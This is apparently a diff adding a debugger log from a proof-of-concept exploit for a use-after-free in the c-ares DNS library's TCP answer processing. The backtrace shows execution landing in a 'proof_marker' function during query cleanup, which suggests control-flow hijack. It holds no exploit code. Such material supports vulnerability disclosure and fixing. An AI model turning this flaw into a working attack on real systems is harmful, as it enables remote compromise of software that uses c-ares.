@@ -1,0 +1,18 @@
+Target: c-ares upstream main
+Commit: c93e50f3ebc0373fe57677523ec960f6c1cb0e15
+
+Thread 1 "cares_tcp_uaf_" hit Breakpoint 1, proof_marker (arg=0x544440) at poc/cares_tcp_uaf_calc_poc.c:64
+
+#0  proof_marker (arg=0x544440) at poc/cares_tcp_uaf_calc_poc.c:64
+#1  0x0000000000418273 in ares_slist_node_destroy (node=0x5444b0) at c-ares-main/src/lib/dsa/ares_slist.c:461
+#2  0x0000000000409606 in ares_query_remove_from_conn (query=0x52daf0) at c-ares-main/src/lib/ares_process.c:72
+#3  0x000000000040bd1f in ares_detach_query (query=0x52daf0) at c-ares-main/src/lib/ares_process.c:1474
+#4  0x000000000040be2c in ares_free_query (query=0x52daf0) at c-ares-main/src/lib/ares_process.c:1512
+#5  0x000000000040a78c in read_answers (conn=0x52f830, now=0x7fffffffdee0) at c-ares-main/src/lib/ares_process.c:656
+#6  0x000000000040a86d in process_read (channel=0x528ab0, read_fd=3, now=0x7fffffffdee0) at c-ares-main/src/lib/ares_process.c:688
+#7  0x0000000000409a68 in ares_process_fds_nolock (channel=0x528ab0, events=0x530360, nevents=1, flags=0) at c-ares-main/src/lib/ares_process.c:214
+#8  0x0000000000409fdb in ares_process (channel=0x528ab0, read_fds=0x7fffffffe0b0, write_fds=0x7fffffffe130) at c-ares-main/src/lib/ares_process.c:367
+#9  0x000000000040324c in main (argc=2, argv=0x7fffffffe318) at poc/cares_tcp_uaf_calc_poc.c:488
+
+rip            0x401d8b            0x401d8b <proof_marker+22>
+rdi            0x544440            5522496
